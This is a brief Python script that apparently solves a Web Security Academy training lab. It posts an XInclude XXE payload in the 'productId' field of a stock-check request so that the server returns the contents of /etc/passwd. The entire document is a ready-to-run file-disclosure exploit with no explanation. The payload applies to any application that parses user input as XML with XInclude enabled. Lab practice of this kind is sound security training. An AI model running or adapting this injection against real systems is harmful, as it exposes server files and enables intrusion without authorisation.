import requests

s = requests.Session()

stock_url = 'https://ac111f8c1f969383c0ad1b23007b0074.web-security-academy.net/product/stock'
post_data = {
    'productId': '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    'storeId': 'foo'
}
resp = s.post(stock_url, data=post_data)
print(resp.text)
